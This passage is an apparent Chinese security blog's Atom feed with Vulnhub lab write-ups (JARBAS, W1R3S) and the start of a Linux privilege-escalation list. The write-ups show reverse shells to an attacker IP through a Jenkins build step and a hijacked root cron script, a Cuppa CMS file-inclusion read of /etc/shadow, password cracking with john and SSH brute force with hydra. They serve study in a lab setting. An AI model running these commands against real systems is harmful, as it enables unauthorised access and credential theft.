<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title></title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-12-27T12:59:21.057Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>xxshh</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Vulnhub-JARBAS</title>
    <link href="http://example.com/2024/12/27/Vulnhub-JARBAS/"/>
    <id>http://example.com/2024/12/27/Vulnhub-JARBAS/</id>
    <published>2024-12-27T08:16:10.000Z</published>
    <updated>2024-12-27T12:59:21.057Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-Introduction"><a href="#0x00-Introduction" class="headerlink" title="0x00 Introduction"></a>0x00 Introduction</h1><p>这个靶场的考察点主要是 Jenkins 的漏洞利用和 crontab 计划任务提权。打靶思路见下图。</p><p><img src="/../images/Pasted%20image%2020241227204804.png"></p><h1 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h1><p>首先对所有端口进行 TCP 扫描：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nmap -sT --min-rate <span class="hljs-number">10000</span> -p- <span class="hljs-number">192.168.46.140</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241227163858.png"></p><p>接下来对这个四个端口进行详细信息扫描:</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nmap -sT -sC -sV -p22,<span class="hljs-number">80</span>,<span class="hljs-number">3306</span>,<span class="hljs-number">8080</span> <span class="hljs-number">192.168.46.140</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241227164331.png"></p><p>对这四个端口的探索及利用排个优先级：80&gt;8080&gt;22&gt;3306。</p><h1 id="0x02-Web渗透"><a href="#0x02-Web渗透" class="headerlink" title="0x02 Web渗透"></a>0x02 Web渗透</h1><p>浏览器访问 <a href="http://192.168.46.140/">http://192.168.46.140</a> :</p><p><img src="/../images/Pasted%20image%2020241227170906.png"></p><p>探索了一下，没发现什么可以利用的点，接下来目录爆破：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gobuster</span> dir -u http://<span class="hljs-number">192.168.46.140</span> --wordlist /usr/share/dirbuster/wordlists/directory-list-<span class="hljs-number">2</span>.<span class="hljs-number">3</span>-medium.txt<br></code></pre></td></tr></table></figure><p>没有爆破到任何信息：</p><p><img src="/../images/Pasted%20image%2020241227175216.png"></p><p>那么限制扩展名试试？根据 Wappalyzer 的分析结果得知后端语言是 PHP，那我们限制扩展名是 php 和 html 试试：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gobuster</span> dir -u http://<span class="hljs-number">192.168.46.140</span> --wordlist /usr/share/dirbuster/wordlists/directory-list-<span class="hljs-number">2</span>.<span class="hljs-number">3</span>-medium.txt -x php,html<br></code></pre></td></tr></table></figure><p>这次爆出有用信息了：</p><p><img src="/../images/Pasted%20image%2020241227175546.png"></p><p>访问 <a href="http://192.168.46.140/access.html">http://192.168.46.140/access.html</a> :</p><p><img src="/../images/Pasted%20image%2020241227175854.png"></p><p>利用 <code>hash-identifier</code>识别一下这是什么加密方式：</p><p><img src="/../images/Pasted%20image%2020241227180622.png"></p><p>找一个 MD5 解密网站，解密结果是：</p><figure class="highlight avrasm"><table><tr><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">tiago:</span> italia99<br><span class="hljs-symbol">trindade:</span> marianna<br><span class="hljs-symbol">eder:</span> vipsu<br></code></pre></td></tr></table></figure><p>一看就是账号密码，ssh 登录试试。</p><p>很遗憾失败了。</p><p>接下来探索 8080 端口，访问 <a href="http://192.168.46.140:8080/">http://192.168.46.140:8080</a> ：</p><p><img src="/../images/Pasted%20image%2020241227181527.png"></p><p>正好是个登录界面，用第三个账号密码登录成功了：</p><p><img src="/../images/Pasted%20image%2020241227181703.png"></p><h1 id="0x03-Jenkins漏洞利用"><a href="#0x03-Jenkins漏洞利用" class="headerlink" title="0x03 Jenkins漏洞利用"></a>0x03 Jenkins漏洞利用</h1><p>看大佬视频才知道 Jenkins 是一个比较出名的工具，用于持续集成（CI）和持续交付（CD），简化软件开发中的构建、测试和部署过程。</p><p>既然如此，用 <code>searchsploit</code> 搜索相关的漏洞及其利用</p><p><img src="/../images/Pasted%20image%2020241227183436.png"></p><p>有这么多公开漏洞，一个一个试不太现实。红队笔记说他对 Jenkins 非常熟悉，因此对漏洞触发的点也非常清楚。我们直接跟着他的思路走，下次再遇到 Jenkins ，直接尝试这个 EXP ，如果不行再尝试其它漏洞。</p><p>新建个项目，项目类型选择第一个：</p><p><img src="/../images/Pasted%20image%2020241227185420.png"></p><p>Build 这栏执行命令的选项。前面信息收集是，我们已经知道了目标主机是 Linux 操作系统，所以选择第二个 <code>Execute shell</code> 。</p><p><img src="/../images/Pasted%20image%2020241227185652.png"></p><p>然后就可以执行反弹 shell 了，本机开启一个 888 监听端口：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">888</span><br></code></pre></td></tr></table></figure><p>生成个命令，复制到输入框里:</p><p><img src="/../images/Pasted%20image%2020241227190255.png"></p><p>save，然后点击 Build Now：<br><img src="/../images/Pasted%20image%2020241227190554.png"></p><p>最后发现错误原因是上面生成的命令中 <code>/888</code> 前面多了个空格，输入正确命令</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="hljs-number">192.168.46.131</span>/<span class="hljs-number">888</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>执行反弹 shell 成功：</p><p><img src="/../images/Pasted%20image%2020241227194127.png"></p><p>当前 shell 不是一个完全交互式的 shell，我们尝试用之前学到的命令升级一下，python 命令成功了：</p><figure class="highlight ada"><table><tr><td class="code"><pre><code class="hljs ada">python -c <span class="hljs-symbol">&#x27;import</span> pty; pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure><h1 id="0x04-提权"><a href="#0x04-提权" class="headerlink" title="0x04 提权"></a>0x04 提权</h1><p>查看相关信息：</p><p><img src="/../images/Pasted%20image%2020241227195647.png"></p><p>查看 <code>/etc/passwd</code>:</p><p><img src="/../images/Pasted%20image%2020241227200618.png"></p><p>可以看到 root 和 eder 是可以使用 bash 的，当前用户不可以使用 bash。</p><p>接下来看<code>/etc/shadow</code>：</p><p><img src="/../images/Pasted%20image%2020241227200814.png"></p><p>很遗憾，没有权限。</p><p>那么就得想其它办法提权了。之前写过一篇权限提升的博客，这里用到的是 Cron 计划任务。</p><p>查看当前服务器的定时任务：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/crontab<br></code></pre></td></tr></table></figure><p>每 5 分钟就会以 root 权限运行 &#x2F;etc&#x2F;script&#x2F;CleaningScript.sh：</p><p><img src="/../images/Pasted%20image%2020241227201754.png"></p><p>查看一下这个文件有没有写权限：</p><p><img src="/../images/Pasted%20image%2020241227202026.png"></p><p>太好了，有写权限，那么我们就可以写入反弹 shell 命令，获取 root 身份的 shell 了。</p><p>本机再开启一个 1234 监听端口，当前 shell 输入以下命令：</p><figure class="highlight autohotkey"><table><tr><td class="code"><pre><code class="hljs autohotkey">echo <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.46.131/1234 0&gt;&amp;1&quot;</span> &gt; /etc/script/CleaningScript.sh<br>// `&gt;`：覆盖写入<br>// `&gt;&gt;`：追加写入<br></code></pre></td></tr></table></figure><p>最多等待 5 分钟，就能成功提权：</p><p><img src="/../images/Pasted%20image%2020241227203022.png"></p><p>获取 flag:</p><p><img src="/../images/Pasted%20image%2020241227203054.png"></p><h1 id="0x05-Conclusion"><a href="#0x05-Conclusion" class="headerlink" title="0x05 Conclusion"></a>0x05 Conclusion</h1><p>这个靶场总体来说不算难，不但巩固了以前学过的知识，也给了我一些启发。比如目录爆破的时候，不带参数扫描不出来结果，如果卡在这里就完全走不下去了。因此以后在做目录爆破的时候，如果一次扫不出结果，可以限定后缀名，或者使用其它工具试试。整个打靶过程，还是比较考验知识储备的，比如我之前根本没听说过 Jenkins ，不过以后再遇到就有思路了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-Introduction&quot;&gt;&lt;a href=&quot;#0x00-Introduction&quot; class=&quot;headerlink&quot; title=&quot;0x00 Introduction&quot;&gt;&lt;/a&gt;0x00 Introduction&lt;/h1&gt;&lt;p&gt;这个靶场的考察点主要</summary>
      
    
    
    
    
    <category term="Vulnhub" scheme="http://example.com/tags/Vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub-W1R3S 1.0.1 &amp; 详述渗透测试思路</title>
    <link href="http://example.com/2024/12/26/Vulnhub-W1R3S-1-0-1-%E8%AF%A6%E8%BF%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%80%9D%E8%B7%AF/"/>
    <id>http://example.com/2024/12/26/Vulnhub-W1R3S-1-0-1-%E8%AF%A6%E8%BF%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%80%9D%E8%B7%AF/</id>
    <published>2024-12-26T06:20:44.000Z</published>
    <updated>2024-12-27T08:36:19.339Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-Introduction"><a href="#0x00-Introduction" class="headerlink" title="0x00 Introduction"></a>0x00 Introduction</h1><p>偶然在 b 站上发现个大佬：红队笔记，第一个视频就是讲解的 Vulnhub-W1R3S 靶场。听完之后，不禁感慨，这绝对是我到目前为止看过的最好的教学视频，全程干货，一点废话都没有，而且逻辑清晰，细节满满。于是跟着打了这个靶场，感觉豁然开朗，记录下来以便日后复习。</p><p><img src="/../images/Pasted%20image%2020241227160050.png"></p><h1 id="0x01-nmap-扫描与分析"><a href="#0x01-nmap-扫描与分析" class="headerlink" title="0x01 nmap 扫描与分析"></a>0x01 nmap 扫描与分析</h1><p>首先扫描靶机所在网段：</p><figure class="highlight armasm"><table><tr><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">sudo</span> nmap -<span class="hljs-meta">sn</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">46</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span>   <br><span class="hljs-comment">// 扫描模式为主机发现（Ping 扫描）。不进行端口扫描，只检查主机是否在线。</span><br></code></pre></td></tr></table></figure><blockquote><ul><li>渗透过程中要养成使用普通用户的习惯，特定操作需要 root 权限时再利用 sudo 提升权限，避免误操作或者给恶意代码和反杀留下机会。</li><li>遇到一些莫名奇妙的问题时，要想到是不是没给 sudo 权限导致的。</li></ul></blockquote><p>根据靶机上线前后 nmap 扫描结果的变化，确认靶机 ip 地址:</p><p><img src="/../images/Pasted%20image%2020241226151054.png"></p><p>接下来对这个 ip 进行<strong>端口扫描</strong>：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><code class="hljs arcade">sudo nmap -sT --<span class="hljs-built_in">min</span>-rate <span class="hljs-number">10000</span> -p- <span class="hljs-number">192.168</span><span class="hljs-number">.46</span><span class="hljs-number">.139</span><br><span class="hljs-comment">// -sT 表示进行TCP扫描，准确率更高。</span><br><span class="hljs-comment">// 经验表明 10000 就是合适的扫描速度。</span><br><span class="hljs-comment">// -p- 表示对所有端口（1-65535）进行扫描。</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241226152420.png"></p><p>扫描结果表明，开放了 21, 22, 80, 3306 这四个端口，接下来进行这几个端口的<strong>详细信息扫描</strong>。这一步很重要，可以确定攻击面和渗透的优先级。</p><figure class="highlight stata"><table><tr><td class="code"><pre><code class="hljs stata">sudo nmap -<span class="hljs-keyword">sT</span> -sV -<span class="hljs-keyword">sC</span> -O -p21,22,80,3306 192.168.46.139<br><span class="hljs-comment">// -sV 表示探测开放服务的版本。</span><br><span class="hljs-comment">// -sC 使用默认的脚本。</span><br><span class="hljs-comment">// -O 表示探测操作系统版本。</span><br><span class="hljs-comment">// -p 表示待扫描的端口</span><br></code></pre></td></tr></table></figure><blockquote><ul><li>精确地使用参数，分阶段地扫描，会大大提升 nmap 的扫描效率和隐蔽性。</li></ul></blockquote><p><img src="/../images/Pasted%20image%2020241226153901.png"></p><p>分析以上扫描结果：</p><ol><li>21 是 ftp 文件传输协议的端口，有可能存在匿名登录和信息泄露。</li><li>22 是 ssh 远程登录端口，一般优先级排后。</li><li>80 是 http 协议端口，是最有可能的突破口。</li><li>3306 是 MySQL 默认端口，可能存在弱密码，或者配合渗透测试其它环节完成利用。</li></ol><p>紧接着进行 <strong>UDP 扫描</strong>。虽然 UDP 端口暴露的攻击面比较小，但在信息搜集阶段就应该搜集得越全面越好。当 TCP 端口没有找到突破口的时候，说不定 UDP 也是一条路。</p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><code class="hljs jboss-cli">sudo nmap -sU <span class="hljs-params">--top-ports</span> 20 192.168.46.139<br><span class="hljs-string">//</span> 仅检查前 20 个最常用的 UDP 端口。<br></code></pre></td></tr></table></figure><p>发现这 20 个端口的状态都是开放&#x2F;被过滤状态，没有明确开放的：</p><p><img src="/../images/Pasted%20image%2020241226162116.png"></p><p>然后我们再使用 nmap 中自带的脚本 vuln 进行<strong>漏洞脚本扫描</strong>。</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nmap -script=vuln -p21,<span class="hljs-number">22</span>,<span class="hljs-number">80</span>,<span class="hljs-number">3306</span> <span class="hljs-number">192.168.46.139</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241226164026.png"></p><p>发现一个 DOS 攻击漏洞，但是一般不会利用这个漏洞，可以忽略。同时还发现了一个 CMS 为Wordpress 的登录页面。</p><p>虽然 UDP 扫描和漏洞脚本扫描对于这台靶机没有扫描出什么有用信息，但是在信息收集阶段值得尝试。</p><h1 id="0x02-FTP渗透"><a href="#0x02-FTP渗透" class="headerlink" title="0x02 FTP渗透"></a>0x02 FTP渗透</h1><p>扫描结果表明，ftp 可以匿名登录，用户名输入 anonymous，密码为空：</p><p><img src="/../images/Pasted%20image%2020241226165253.png"></p><p>提示用二进制模式传输文件，所以这里要养成一个习惯，进入 ftp 后首先输入<code>binary</code>切换到二进制模式，否则下载的可执行文件可能是损坏的。</p><p>发现三个目录：</p><p><img src="/../images/Pasted%20image%2020241226165815.png"></p><p>首先进入 content 目录，发现三个 .txt 文件:</p><p><img src="/../images/Pasted%20image%2020241226165956.png"></p><p>使用以下命令直接一次性下载多个文件：</p><figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">mget</span> <span class="hljs-regexp">*.txt</span><br></code></pre></td></tr></table></figure><p>但是每下载一个文件，就需要一个交互式的操作：</p><p><img src="/../images/Pasted%20image%2020241226170327.png"></p><p>如果下载的文件很多的话，就会很麻烦。这里可以输入 <code>prompt</code> 关闭交互模式。</p><p>相同操作把其它两个目录的文件也下载下来，并查看。</p><p>01.txt:</p><p><img src="/../images/Pasted%20image%2020241226172350.png"></p><p>没什么有用信息，但是也有所收获。之前一直疑惑为什么总看到类似 W1R3S 的写法，现在知道了这种形式叫做 leetspeak，最初是用来解决用户名重复的问题的。对于渗透测试人员，看到 new 这个词，就知道它可能建设得还不完善，此时应该更有信心了。</p><p>02.txt:</p><p><img src="/../images/Pasted%20image%2020241226173157.png"></p><p>这是两段加密文本。Kali 中自带一个 hash-identifier：</p><p><img src="/../images/Pasted%20image%2020241226173709.png"></p><p>识别出这是 MD5 加密。找个在线网站解密：</p><p><img src="/../images/Pasted%20image%2020241226173921.png"></p><p>看下一个密文，根据经验判断这是 base64 加密：base64 的字符组成包括 <code>0-9</code>, <code>a-z</code>, <code>A-Z</code>, <code>+</code>, <code>/</code> ,<code>=</code>。<code>=</code>只在文末出现，最多2个，起补位作用。</p><p>kali 中直接进行 base64 解密：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==&#x27;</span> | <span class="hljs-built_in">base64</span> -d<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241226174914.png"></p><p>03.txt:</p><p><img src="/../images/Pasted%20image%2020241226175108.png"></p><p>搜索 ASCII Art Generator ，即可生成这种形式的文字：</p><p><img src="/../images/Pasted%20image%2020241226175715.png"></p><p>emploee-names.txt:</p><p><img src="/../images/Pasted%20image%2020241226180231.png"></p><p>看到这些信息，要基于角色去思考这些人的账号权限有什么，能看到什么信息，这也是渗透测试的重要思路。比方说经理的权限说不定会很高，网页设计者可能在 web 开发中有一些自己的习惯，HR是我们社工的主要对象等等。</p><p>worktodo.txt：</p><p><img src="/../images/Pasted%20image%2020241226180005.png"></p><p>I don’t think this is the way to root；we have a lot of work to do, stop playing around…</p><p>FTP 能看到的就这么多了。</p><h1 id="0x03-Web渗透"><a href="#0x03-Web渗透" class="headerlink" title="0x03 Web渗透"></a>0x03 Web渗透</h1><p>浏览器访问 <a href="http://192.168.46.139/">http://192.168.46.139</a>:</p><p><img src="/../images/Pasted%20image%2020241226181456.png"></p><p>是 Apache 的默认页，没什么价值，但现实中不排除存在一些信息泄露。</p><p>接下来进行<strong>目录爆破</strong>：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> gobuster dir -u http://<span class="hljs-number">192.168.46.139</span> --wordlist /usr/share/dirbuster/wordlists/directory-list-<span class="hljs-number">2</span>.<span class="hljs-number">3</span>-medium.txt<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241226182939.png"></p><p>挨个试试。首先访问 <a href="http://192.168.46.139/wordpress">http://192.168.46.139/wordpress</a> ，发现网页自动跳转到 localhost:</p><p><img src="/../images/Pasted%20image%2020241226183142.png"></p><p>在之前的靶场练习中，我们学过在<code>/etc/hosts</code>文件中手动添加域名和 ip 地址的映射关系，这里也这样操作。但是手动添加映射后，访问 localhost 依然无法连接。我们再添加一个 <code>xxshh.com</code>指向靶机地址以做验证，发现访问成功。原因是 kali 不允许 localhost 指向非本机 ip。目前这条路走不通了。</p><h1 id="0x04-CMS渗透"><a href="#0x04-CMS渗透" class="headerlink" title="0x04 CMS渗透"></a>0x04 CMS渗透</h1><p>访问 <a href="http://192.168.46.139/administrator">http://192.168.46.139/administrator</a> :</p><p><img src="/../images/Pasted%20image%2020241226191307.png"></p><p>是一个 CMS 安装页面，而且暴露了该 CMS 是 Cuppa。整个页面只有一个 next 按钮可以点。这里要有一个心理预期，要思考下一步操作会不会对服务器做不可逆的修改或者被管理员发现，谨慎操作。</p><p>点击 next，看到一个安装的配置页面：</p><p><img src="/../images/Pasted%20image%2020241226204243.png"></p><p>发现一个错误拼写，这在实战中是可以利用的：</p><p><img src="/../images/Pasted%20image%2020241226204521.png"></p><p>因为这种错误具有独特性，实战中在纠结是否进行下一步时，通过搜索这个错误拼写可能找到类似的场景，就会知道下一步操作会带来什么结果。</p><p>填写信息后点击 next:</p><p><img src="/../images/Pasted%20image%2020241226205139.png"></p><p>安装失败，此时已经没有其它可用信息了。但是所幸我们已经知道这个 CMS 是 Cuppa 了，接下来的思路就是搜索 Cuppa 是否有公开漏洞可以利用。</p><p><code>searchsploit</code> 是一个命令行工具，用于快速搜索 Exploit Database (<a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a>) 中的漏洞和利用代码。</p><figure class="highlight ebnf"><table><tr><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">searchsploit cuppa</span> <br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241226210239.png"></p><p>发现有一个远程文件包含漏洞，我们把这个 25971.txt 下载下来看看怎么利用 ：</p><figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">searchsploit</span> cuppa -m <span class="hljs-number">25971</span>.txt  <span class="hljs-comment"># m:mirror</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241226210558.png"></p><p>查看这个文件，仔细阅读漏洞相关信息及利用：</p><p><img src="/../images/Pasted%20image%2020241226211707.png"></p><p>首先尝试本地文件包含：</p><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">46.139</span><span class="hljs-regexp">/cuppa/</span>alerts<span class="hljs-regexp">/alertConfigField.php?urlConfig=../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br></code></pre></td></tr></table></figure><p>发现路径不对：</p><p><img src="/../images/Pasted%20image%2020241226211951.png"></p><p>接下来就要猜路径了，&#x2F;alerts 肯定要有，已知安装页面的路径是 &#x2F;administrator，那么猜测：</p><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">46.139</span><span class="hljs-regexp">/administrator/</span>alerts<span class="hljs-regexp">/alertConfigField.php?urlConfig=../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br></code></pre></td></tr></table></figure><p>发现有反应，但是并没有读取到 passwd 文件：</p><p><img src="/../images/Pasted%20image%2020241226212508.png"></p><p>此时要去思考后端的处理逻辑，urlConfig 这个参数有可能不是 GET 形式，而且 exp 中还提到了 base64 我们还没有用到。</p><p>尝试着搜索源码，如果能找到，就可以做代码审计验证我们的猜测了。</p><p><img src="/../images/Pasted%20image%2020241226213703.png"></p><p>去 <code>/alerts/alertConfigField</code>中搜索相关代码，发现是用 POST 方式处理参数的：</p><p><img src="/../images/Pasted%20image%2020241226213827.png"></p><p>访问 <a href="http://192.168.46.139/administrator/alerts/alertConfigField.php">http://192.168.46.139/administrator/alerts/alertConfigField.php</a> ，用 BurpSuite 抓包，修改请求方式，成功读取 passwd 文件：</p><p><img src="/../images/Pasted%20image%2020241226214348.png"></p><h1 id="0x05-密码爆破"><a href="#0x05-密码爆破" class="headerlink" title="0x05 密码爆破"></a>0x05 密码爆破</h1><p>每条用户数据的第二条都是 x ，证明密码以 hash 的形式存在了 <code>etc/shadow</code> 中，读取：</p><p><img src="/../images/Pasted%20image%2020241226214710.png"></p><p>新建一个名为 hash 的文件，将有 hash 值的三个用户信息复制进去：</p><p><img src="/../images/Pasted%20image%2020241226215132.png"></p><p>用之前打靶了解到的 john 破解哈希密码：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><code class="hljs arcade">john <span class="hljs-built_in">hash</span><br></code></pre></td></tr></table></figure><p>很快就破解出了后两个用户，root一直破解不出来：</p><p><img src="/../images/Pasted%20image%2020241226215451.png"></p><h1 id="0x06-ssh登录及提权"><a href="#0x06-ssh登录及提权" class="headerlink" title="0x06 ssh登录及提权"></a>0x06 ssh登录及提权</h1><p>一般 www-data 是功能性账号，我们优先探索 w1r3s ：</p><figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sudo</span> ssh w1r3s@<span class="hljs-number">192.168.46.139</span><br></code></pre></td></tr></table></figure><p>登录成功：</p><p><img src="/../images/Pasted%20image%2020241226220744.png"></p><p><img src="/../images/Pasted%20image%2020241226221006.png"></p><p>第一个 ALL 表示 w1r3s 可以在任何主机上执行命令（适用于所有主机）。第二个 ALL 表示 w1r3s 可以以任何用户身份执行命令。最后的 ALL 表示没有限制，w1r3s 可以执行所有命令。这说明 w1r3s 拥有和 root 一样的权限，以 sudo 的权限运行&#x2F;bin&#x2F;bash，提权成功！</p><p><img src="/../images/Pasted%20image%2020241226221403.png"></p><p><img src="/../images/Pasted%20image%2020241226222131.png"></p><h1 id="0x07-补充"><a href="#0x07-补充" class="headerlink" title="0x07 补充"></a>0x07 补充</h1><p>虽然已经拿到了 flag，但我们还是继续探索其它两个端口，毕竟这篇文章的主要目的是详述渗透测试的思路。</p><p>首先尝试 mysql 登录。</p><p>在一开始没有用户信息时，尝试以 root 身份无密码登录：</p><figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">mysql</span> -h <span class="hljs-number">192.168.46.139</span> -u root -p<br></code></pre></td></tr></table></figure><p>失败。以 www-data 和  w1r3s 身份登录，也都失败了。于是放弃这个端口。</p><p>接下来尝试 22 端口。一般 ssh 暴力破解的可能性不大，并不推荐。但在实际渗透过程中，如果其它方法行不通，也可以尝试一下。</p><p>结合 ftp 泄露的信息和可能的用户名构造个字典：</p><p><img src="/../images/Pasted%20image%2020241226224223.png"></p><p>用 hydra 破解密码：</p><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">hydra -L user.txt -P <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt ssh:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">46.139</span> -t <span class="hljs-number">4</span><br><span class="hljs-regexp">//</span>rockyou.txt在英语环境中做密码破解效率还是很高的<br><span class="hljs-regexp">//</span>-t:线程数<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241226225149.png"></p><h1 id="0x08-Conclusion"><a href="#0x08-Conclusion" class="headerlink" title="0x08 Conclusion"></a>0x08 Conclusion</h1><p>作为一个网安领域的新人，目前学习了也有几个月了，能明显感觉到自己的进步，但也知道自己水平差得还很远。看完视频，打完这个靶场，我对渗透测试的思路更加明确了。近期任务就是多打 vulnhub，争取早日独立打靶成功。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-Introduction&quot;&gt;&lt;a href=&quot;#0x00-Introduction&quot; class=&quot;headerlink&quot; title=&quot;0x00 Introduction&quot;&gt;&lt;/a&gt;0x00 Introduction&lt;/h1&gt;&lt;p&gt;偶然在 b 站上发现</summary>
      
    
    
    
    
    <category term="红队技能" scheme="http://example.com/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/"/>
    
    <category term="Vulnhub" scheme="http://example.com/tags/Vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>权限提升</title>
    <link href="http://example.com/2024/12/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    <id>http://example.com/2024/12/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</id>
    <published>2024-12-23T08:20:09.000Z</published>
    <updated>2024-12-25T14:31:36.021Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux权限提升"><a href="#Linux权限提升" class="headerlink" title="Linux权限提升"></a>Linux权限提升</h1><h2 id="1-内核提权"><a href="#1-内核提权" class="headerlink" title="1. 内核提权"></a>1. 内核提权</h2><h3 id="相关命令及脚本"><a href="#相关命令及脚本" class="headerlink" title="相关命令及脚本"></a>相关命令及脚本</h3><ul><li><strong>信息收集</strong></li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">//查看当前主机的操作系统：<br>hostnamectl<br><span class="hljs-built_in">cat</span> /etc/*-release<br>lsb_release -a <br><span class="hljs-built_in">cat</span> /etc/lsb-release <span class="hljs-comment"># Debain</span><br><span class="hljs-built_in">cat</span> /etc/redhat-release <span class="hljs-comment"># Redhat</span><br><span class="hljs-built_in">cat</span> /etc/centos-release  <span class="hljs-comment"># Centos</span><br><span class="hljs-built_in">cat</span> /etc/os-release  <span class="hljs-comment"># Ubuntu</span><br><span class="hljs-built_in">cat</span> /etc/issue<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">//查看当前主机的内核版本：<br><span class="hljs-built_in">uname</span> -a <br><span class="hljs-built_in">uname</span> -r<br>hostnamectl<br><span class="hljs-built_in">cat</span> /proc/version<br>dmesg | grep <span class="hljs-string">&quot;Linux version&quot;</span><br></code></pre></td></tr></table></figure><ul><li><strong>内核漏洞筛选</strong></li></ul><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>提权脚本：<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/liamg/</span>traitor<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/The-Z-Labs/</span>linux-exploit-suggester(常用 ./sh文件)<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/jondonas/</span>linux-exploit-suggester-<span class="hljs-number">2</span>(pl文件)<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/belane/</span>linux-soft-exploit-suggester(py文件)<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>综合脚本：<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/carlospolop/</span>PEASS-ng <span class="hljs-comment"># 前面 htb 靶场用过</span><br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/diego-treitos/</span>linux-smart-enumeration<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/redcode-labs/</span>Bashark<br>https:<span class="hljs-regexp">//gi</span>thub.com<span 